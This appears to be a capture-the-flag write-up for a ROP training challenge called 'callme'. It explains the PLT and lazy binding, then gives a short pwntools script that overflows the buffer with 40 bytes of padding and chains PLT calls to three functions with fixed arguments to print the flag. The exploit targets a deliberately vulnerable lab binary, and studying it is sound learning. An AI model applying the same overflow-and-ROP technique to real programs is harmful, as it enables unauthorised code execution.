# Description

### Failure is not an option

How do you make consecutive calls to a function from your ROP chain that won't crash afterwards? If you keep using the call instructions already present in the binary your chains will eventually fail. Consider why this might be the case.

### Procedure Linkage

The Procedure Linkage Table (PLT) is used to resolve function addresses in imported libraries at runtime, it's worth reading up about it and how lazy binding works. Even better, go ahead and step through the lazy linking process in a debugger, it's important you understand what resides at the addresses reported to you by commands like `rabin2 -i` and  `rabin2 -R`

### Correct order

I'll tell you the following:
You must call the `callme_one()` , `callme_two()` and `callme_three()`  functions in that order, each with the arguments 0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d e.g.  callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)  to print the flag.

The solution here is simple enough, use your knowledge about what resides in the PLT to call the `callme_`  functions in the above order and with the correct arguments.

Don't get distracted by the incorrect calls to these functions made in the binary, they're there to ensure these functions get linked. You can also ignore the .dat files and encrypted flag in this challenge, they're there to ensure the functions must be called in the correct order.

## Solution
We just need to call the three functions with the correct arguments and we get back the flag. Ez pz.

```python
from pwn import *

context.binary = "./callme"
r = ROP(context.binary)
p = process()
r.callme_one(0xDEADBEEFDEADBEEF, 0xCAFEBABECAFEBABE, 0xD00DF00DD00DF00D)
r.callme_two(0xDEADBEEFDEADBEEF, 0xCAFEBABECAFEBABE, 0xD00DF00DD00DF00D)
r.callme_three(0xDEADBEEFDEADBEEF, 0xCAFEBABECAFEBABE, 0xD00DF00DD00DF00D)
p.send(b"A" * 8 * 5 + r.chain())
log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
```